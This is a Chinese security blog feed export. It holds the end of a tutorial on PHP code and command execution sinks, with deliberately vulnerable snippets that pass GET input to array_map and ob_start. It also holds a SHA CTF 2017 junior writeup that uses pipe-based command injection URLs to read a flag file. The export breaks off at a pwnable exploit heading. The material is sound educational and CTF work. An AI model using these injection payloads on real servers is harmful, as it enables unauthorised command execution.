<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$array = <span class="keyword">array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</div><div class="line">	array_map($_GET[<span class="string">'chybeta'</span>],$array);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php</div><div class="line">?chybeta=phpinfo</div></pre></td></tr></table></figure></p>
<p>注意没有括号<code>()</code>和分号<code>;</code>。</p>
<h2 id="系统命令执行相关"><a href="#系统命令执行相关" class="headerlink" title="系统命令执行相关"></a>系统命令执行相关</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string system ( string $command [, int &amp;$return_var ] )</div></pre></td></tr></table></figure>
<p>command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	system(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>会看到运行了shell命令，并打印回显到页面上。</p>
<h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void passthru ( string $command [, int &amp;$return_var ] )</div></pre></td></tr></table></figure>
<p>command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	passthru(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</div></pre></td></tr></table></figure>
<p>exec() 执行 command 参数所指定的命令。 其余参数，见<a href="http://php.net/manual/zh/function.exec.php" target="_blank" rel="external">文档</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">echo</span> exec(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void pcntl_exec ( string $path [, array $args [, array $envs ]] )</div></pre></td></tr></table></figure>
<p>path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本<br>args是一个要传递给程序的参数的字符串数组。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	pcntl_exec ( <span class="string">"/bin/bash"</span> , <span class="keyword">array</span>(<span class="string">"whoami"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string shell_exec ( string $cmd )</div></pre></td></tr></table></figure>
<p>cmd是要执行的命令。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">echo</span> shell_exec(<span class="string">"whoami"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource popen ( string $command , string $mode )</div></pre></td></tr></table></figure>
<p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$handle = popen(<span class="string">"/bin/ls"</span>, <span class="string">"r"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open()"></a>proc_open()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )</div></pre></td></tr></table></figure>
<p>cmd是要执行的命令，其余见<a href="http://php.net/manual/zh/function.proc-open.php" target="_blank" rel="external">文档</a></p>
<h3 id="反单引号"><a href="#反单引号" class="headerlink" title="`(反单引号)"></a>`(反单引号)</h3><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">echo</span> `whoami`;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</div></pre></td></tr></table></figure>
<p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。</p>
<p>可选参数 output_callback 函数可以被指定。 此函数把一个字符串当作参数并返回一个字符串。 当输出缓冲区被( ob_flush(), ob_clean() 或者相似的函数)冲刷（送出）或者被清洗的时候；或者在请求结束之际输出缓冲区内容被冲刷到浏览器的时候该函数将会被调用。 当调用 output_callback 时，它将收到输出缓冲区的内容作为参数 并预期返回一个新的输出缓冲区作为结果，这个新返回的输出缓冲区内容将被送到浏览器。</p>
<p>下面的代码，由于调用了ob_end_flush()，所以会调用ob_start($cmd)中的cmd，把我们输入的$_GET[a]作为cmd的参数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$cmd = <span class="string">'system'</span>;</div><div class="line">	ob_start($cmd);</div><div class="line">	<span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;</div><div class="line">	ob_end_flush();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/codeexec.php?a=whoami</div></pre></td></tr></table></figure></p>
<h1 id="php-mail"><a href="#php-mail" class="headerlink" title="php mail()"></a>php mail()</h1><p><a href="http://php.net/manual/zh/function.mail.php" target="_blank" rel="external">mail 文档</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">bool mail (</div><div class="line">	string $to ,</div><div class="line">	string $subject ,</div><div class="line">	string $message [,</div><div class="line">	string $additional_headers [,</div><div class="line">	string $additional_parameters ]]</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>要使用mail()函数，需要配置对应的服务器等，在php.ini中有两个选项：</p>
<ul>
<li>配置SMTP服务器的主机名和端口</li>
<li>配置PHP用作邮件传输代理（MTA）的文件路径</li>
</ul>
<p>当PHP配置了第二个选项时，对该mail()函数的调用将导致执行配置对MTA程序。虽然PHP内部使用escapeshellcmd()用于程序调用，防止新的shell命令注入，但第5个参数$additional_parameters中mail()允许添加的新程序。因此，攻击者可以附加程序标志，在某些MTA中可以创建具有用户控制内容的文件。</p>
<p>实例：<a href="http://blog.nsfocus.net/tag/php-mail%E5%87%BD%E6%95%B0%E5%BC%95%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">多个PHP mail函数引发的命令执行漏洞分析</a></p>
<p>参考：<a href="http://www.91ri.org/17039.html" target="_blank" rel="external">为什么mail()函数在PHP中是危险的</a></p>
<h1 id="反序列化问题"><a href="#反序列化问题" class="headerlink" title="反序列化问题"></a>反序列化问题</h1><p>见：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">浅谈php反序列化漏洞 </a></p>
<h1 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h1><p>实例：<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=25351&amp;extra=page%3D1%26filter%3Dtypeid%26typeid%3D146" target="_blank" rel="external">第十届全国大学生信息安全技能赛PHP execise</a><br>参考: <a href="http://wooyun.jozxing.cc/static/drops/tips-16054.html" target="_blank" rel="external">利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</a></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html" target="_blank" rel="external">Obvious and not so obvious PHP code injection and evaluation</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php代码/命令执行漏洞&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>SHACTF-2017-Growing Up-writeup</title>
    <link href="http://yoursite.com/2017/08/06/SHACTF-2017-Growing-Up-writeup/"/>
    <id>http://yoursite.com/2017/08/06/SHACTF-2017-Growing-Up-writeup/</id>
    <published>2017-08-06T15:15:37.000Z</published>
    <updated>2017-08-06T18:32:14.097Z</updated>
    
    <content type="html"><![CDATA[<p>SHACTF-2017-Growing Up-writeup 单刷。<br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Growing Up这题题目如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You remember the day you started hacking or playing CTF&apos;s? You can relive these days by playing our junior version. Just solve all challenges to get the flag ;-)</div></pre></td></tr></table></figure></p>
<p>所以只有当把 <a href="https://junior.stillhackinganyway.nl/" target="_blank" rel="external">Junior</a>上的题全做完后才能拿到flag。自己一个人单刷了四五个小时，最后于凌晨2：25分拿到了这题的flag。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/22.png?raw=true" alt=""></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="All-about-the-Base-1"><a href="#All-about-the-Base-1" class="headerlink" title="All about the Base (1)"></a>All about the Base (1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">We found this encoded message. Can you decode it?</div><div class="line">V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNl</div><div class="line">ZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXku</div><div class="line">IAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZm</div><div class="line">YWQ0NDM5Y2YzMjFmZTV9Cg==</div></pre></td></tr></table></figure>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import base64</div><div class="line">&gt;&gt;&gt; base64.b64decode(&quot;V2VsbCBkb25lLAoKdGhpcyBmaWxlIGlzIGVuY3J5cHRlZCB3aXRoIEJhc2U2NC4gT2Z0ZW4gdXNl ZCBpbiBDVEYncyB0byBkaXNwbGF5IGJpbmFyeSBkYXRhIGluIGEgbW9yZSBmcmllbmRseSB3YXku IAoKVGhlIGZsYWcgZm9yIHRoaXMgY2hhbGxlbmdlIGlzIGZsYWd7YjNlOWMzZWVlNjA5YmFjNDZm YWQ0NDM5Y2YzMjFmZTV9Cg==&quot;)</div><div class="line">&quot;Well done,\n\nthis file is encrypted with Base64. Often used in CTF&apos;s to display binary data in a more friendly way. \n\nThe flag for this challenge is flag&#123;b3e9c3eee609bac46fad4439cf321fe5&#125;\n&quot;</div></pre></td></tr></table></figure></p>
<h2 id="Rotation-1"><a href="#Rotation-1" class="headerlink" title="Rotation (1)"></a>Rotation (1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Seems someone rotated the alphabet, can you get the original message back?</div><div class="line">Ykksy eua ckxk ghrk zu mkz znk zkdz hgiq. Znk lrgm oy lrgm&#123;30j3g1gg0ijg9l08ijlg52668hi6854g&#125;</div></pre></td></tr></table></figure>
<p>凯撒<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Seems you were able to get the text back. The flag is flag&#123;30d3a1aa0cda9f08cdfa52668bc6854a&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Substitute-Teacher-2"><a href="#Substitute-Teacher-2" class="headerlink" title="Substitute Teacher (2)"></a>Substitute Teacher (2)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Hello, my name is Mr. Smith, I will be your substitute teacher for today. I only have one assignment for you today, if you solve it you may go home. Now be silence and solve it, so I can Netflix and chill!</div><div class="line">osvi cpm dprzsob ulsd hddsboeiou. iocpg gpaj njii usei. rihzi uli vrhdd tsulpau ehfsob h dpaow,</div><div class="line">s&apos;e so uli eswwri pn h oit iqsdpwi pn pjhobi sd uli oit mrhvf po oiunrsy. npj gpaj innpjud s lhzi</div><div class="line">h nrhb npj gpa: nrhb&#123;h230h7i624hnhv36291v5n31nh818w6n&#125;</div></pre></td></tr></table></figure>
<p>词频分析一下，丢到这个网站 <a href="http://quipqiup.com/" target="_blank" rel="external">http://quipqiup.com/</a> ：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a230a7e624afac36291c5f31fa818d6f&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Exclusive-or-…-2"><a href="#Exclusive-or-…-2" class="headerlink" title="Exclusive or … (2)"></a>Exclusive or … (2)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We found this strange text, can you get the original from it?</div></pre></td></tr></table></figure>
<p>题目说得很明显啦，异或加密。我们可以用工具xortool。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/15.png?raw=true" alt=""></p>
<p>得到明文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Well done. This text is encrypted with XOR with the single character &apos;\x03&apos;. XOR is often used in CTF challenges. We did use it in our teaser challenges &apos;Crypto Engine&apos; and &apos;Website Attack&apos;. The flag of this challenge is: flag&#123;a157d2b4eb73c60ff0cdbe2a2dea06c3&#125;</div></pre></td></tr></table></figure></p>
<p>flag为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a157d2b4eb73c60ff0cdbe2a2dea06c3&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Transposition-3"><a href="#Transposition-3" class="headerlink" title="Transposition (3)"></a>Transposition (3)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">We intercepted this secret message. We believe it is using a transposition cipher. Can you decipher it?</div><div class="line">Citgoe6b0 oohern636 nni.tg1e2 gssThe58e rschii366</div><div class="line">aohess3ae tlafcf3dc uvllhl24f lilaaa730 aneglg506 tgnfl&#123;33&#125;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/14.png?raw=true" alt=""></p>
<p>竖下来读。得到明文<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Congratulationssolvingthischallenge.Theflagforthischalengeisflag&#123;66153332753b3e86ad4303062e6ecf06&#125;</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;66153332753b3e86ad4303062e6ecf06&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Deleted-File-3"><a href="#Deleted-File-3" class="headerlink" title="Deleted File (3)"></a>Deleted File (3)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/7.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;129F0A52F0F41E077E0FD03063FF4FAD&#125;</div></pre></td></tr></table></figure>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Zipfile-One-1"><a href="#Zipfile-One-1" class="headerlink" title="Zipfile One (1)"></a>Zipfile One (1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We received this zip file, but is asking for a password. All we know is that the password exists of 5 numbers, can you crack this password to get the hidden information?</div></pre></td></tr></table></figure>
<p>给了压缩包，又说了是五个数字。爆破得密码为42831。flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;d6f56ae046bb241cc61f9d26f8e525d9&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Zipfile-Two-2"><a href="#Zipfile-Two-2" class="headerlink" title="Zipfile Two (2)"></a>Zipfile Two (2)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We received another zip file, which also requires a password. All we know is that the password is an existing English word with a length of 6 and all lowercase. Can you crack this password?</div></pre></td></tr></table></figure>
<p>继续爆破，得密码为：future。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;7128d78caf1e3297386a09afae0f8ea4&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Reverse-3"><a href="#Reverse-3" class="headerlink" title="Reverse (3)"></a>Reverse (3)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">We found this file on a server on the other side of the world, it looks weird, can you &quot;reverse&quot; it?</div></pre></td></tr></table></figure>
<p>一开始做的时候，从后读取放到新文件里，比如<code>\x74 \xe4 \x05 \x98</code>对应成<code>\x98 \x05 \xe4 \x7</code>，结果输出后发现没用。后面突然想到，74e40598，直接尼过来是 89504e47，这个正是png的文件头。</p>
<p>所以我先把原文件的十六进制拿了出来，把里面的空格，换行符去掉，放到reverse_fix中。用下面的脚本得到“逆向”后的十六进制。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">reverse  = open(<span class="string">"reverse_fix"</span>,<span class="string">"r"</span>)</div><div class="line">flag_reverse = open(<span class="string">"flag_reverse.txt"</span>,<span class="string">"wb"</span>)</div><div class="line">data = reverse.read()</div><div class="line">datalen = len(data)</div><div class="line"></div><div class="line">data = data[::<span class="number">-1</span>]</div><div class="line"></div><div class="line">flag_reverse.write()</div><div class="line"></div><div class="line">reverse.close()</div><div class="line">flag_reverse.close()</div></pre></td></tr></table></figure></p>
<p>之后再把flag_reverse.txt中的内容复制到十六进制编辑器中，保存为一张图片。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/12.png?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/13.png?raw=true" alt=""></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;758d7fa2762ab838c4835f1995e151d2&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><h2 id="Download-1"><a href="#Download-1" class="headerlink" title="Download (1)"></a>Download (1)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/6.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;259F1B841EAAA4FCB843D77DCDADE55A&#125;</div></pre></td></tr></table></figure>
<h2 id="Wanna-Buy-A-Flag-2"><a href="#Wanna-Buy-A-Flag-2" class="headerlink" title="Wanna Buy A Flag? (2)"></a>Wanna Buy A Flag? (2)</h2><p>打开后追踪TCP流，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;f08574923ec9c9ffb47188e6edc1a20f&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Weird-Website-3"><a href="#Weird-Website-3" class="headerlink" title="Weird Website (3)"></a>Weird Website (3)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/8.png?raw=true" alt=""></p>
<p>导出页面后查看。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;8233daf526dcee25fd9ffda3bb99d677&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Captured-Mail-4"><a href="#Captured-Mail-4" class="headerlink" title="Captured Mail (4)"></a>Captured Mail (4)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/9.png?raw=true" alt=""></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line">capturedmail = open(<span class="string">"capturedmail.zip"</span>,<span class="string">"wb"</span>)</div><div class="line"></div><div class="line">data = <span class="string">"UEsDBBQAAAAIAIy53UoyFb1+UwAAAFgAAAAIABwAZmxhZy50eHRVVAkAAzhtVVk4bVVZdXgLAAEE6AMAAAToAwAAFclLCoAgEADQfaeYA0QQMaOz7iSjjB8QBbVVdPdq+Xhnq7HLvIrM3OpYYSaFUCRCaP1DHuCTlKI1Knz4694dsrHGGELrxAuzV8JDAgVBJn225QVQSwECHgMUAAAACACMud1KMhW9flMAAABYAAAACAAYAAAAAAABAAAApIEAAAAAZmxhZy50eHRVVAUAAzhtVVl1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAAlQAAAAAA"</span></div><div class="line"></div><div class="line">capturedmail.write(base64.b64decode(data))</div><div class="line"></div><div class="line">capturedmail.close()</div></pre></td></tr></table></figure>
<p>得到一个压缩包，解压后得到flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;1b5978777658baca99ce653af6fa596e&#125;</div></pre></td></tr></table></figure>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="In-Your-Head-1"><a href="#In-Your-Head-1" class="headerlink" title="In Your Head (1)"></a>In Your Head (1)</h2><p>地址：<a href="http://inyourhead.stillhackinganyway.nl/" target="_blank" rel="external">http://inyourhead.stillhackinganyway.nl/</a></p>
<p>抓包看头部，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a1a4d64086f713e92a809859d930d120&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Old-School-2"><a href="#Old-School-2" class="headerlink" title="Old School (2)"></a>Old School (2)</h2><p>地址：<a href="http://oldschool.stillhackinganyway.nl/" target="_blank" rel="external">http://oldschool.stillhackinganyway.nl/</a><br>抓包修改User-Agent头：Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;f374df6554c7c6a6fced10396c84baf6&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Broken-Image-2"><a href="#Broken-Image-2" class="headerlink" title="Broken Image (2)"></a>Broken Image (2)</h2><p>查看源代码，把base64串进行解密。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;c0711614358a27110ca159302b106759&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Location-3"><a href="#Location-3" class="headerlink" title="Location (3)"></a>Location (3)</h2><p>点进去后，每次访问一个新的页面，就记下页面的三个字母。等跳转完把字母拼接起来就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;f51cf5e7e1d003986acd2864139553a1&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Ping-4"><a href="#Ping-4" class="headerlink" title="Ping (4)"></a>Ping (4)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ping.stillhackinganyway.nl/?ip=127.0.0.1|ls</div></pre></td></tr></table></figure>
<p>知道有 s3cr3tfl4g.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ping.stillhackinganyway.nl/?ip=127.0.0.1|cat s3cr3tfl4g.txt</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;a8bb1ea55704762941ef519f98fff075&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Pwnable"><a href="#Pwnable" class="headerlink" title="Pwnable"></a>Pwnable</h1><h2 id="small-4"><a href="#small-4" class="headerlink" title="small (4)"></a>small (4)</h2><p>服务器端是python服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">print</span> <span class="string">"HACK "</span>*input(<span class="string">"Number: "</span>)</div></pre></td></tr></table></figure></p>
<p>以下是exp：</p>
